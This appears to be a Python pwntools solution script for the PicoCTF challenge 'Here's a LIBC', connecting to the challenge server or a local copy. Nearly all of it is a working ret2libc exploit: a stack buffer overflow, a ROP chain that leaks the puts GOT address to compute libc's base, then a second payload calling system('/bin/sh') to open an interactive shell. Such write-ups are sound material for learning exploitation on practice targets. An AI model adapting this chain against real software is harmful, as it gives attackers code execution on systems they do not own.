#!/usr/bin/env python3

"""
Toast's submission for the PicoCTF challenge Here's a LIBC.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will operate with GDB attached.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

gdb_script = """
b scanf
"""

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('mercury.picoctf.net', 24159)
    elif args.get('LOCAL'):
        io = process([exe.path])
    else:
        io = gdb.debug([exe.path], gdb_script)

    return io

def get_offset():
    with conn() as io:
        pattern = cyclic(n=8, length=150)
        io.sendline(pattern)
    
    offset = cyclic_find(0x6161616161616172, n=8)
    print(f"Offset = {offset}")
    return offset


def main():
    '''Return the flag.
    '''


    offset = 136

    rop = ROP(exe)
    with conn() as io:
        pattern = b"A" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \
                    p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.symbols['main'])
        io.sendline(pattern)
        io.recvlines(2)
        # Get the puts output of the puts GOT address
        got_addr = io.recvline()
        # Strip newline
        got_addr = got_addr[:-1]
        
        # Pad for packing
        pad_len = 8 - len(got_addr)
        got_addr = got_addr + (b"\x00" * pad_len)

        print(f"GOT ADDR: {hex(u64(got_addr))}")
        base_addr = u64(got_addr) - 0x180a30
        print(f"Base addr: {hex(base_addr)}")
        system_addr = base_addr + 0x0014f4e0
        print(f"System addr: {hex(system_addr)}")
        bin_sh_addr = base_addr + 0x2b40fa
        
        payload = b"A" * offset + p64(rop.find_gadget(['pop rdi', 'ret'])[0]) + \
                    p64(bin_sh_addr) + p64(rop.find_gadget(['ret'])[0]) + \
                    p64(system_addr)
        io.sendline(payload)
        io.interactive()


if __name__ == '__main__':
    main()
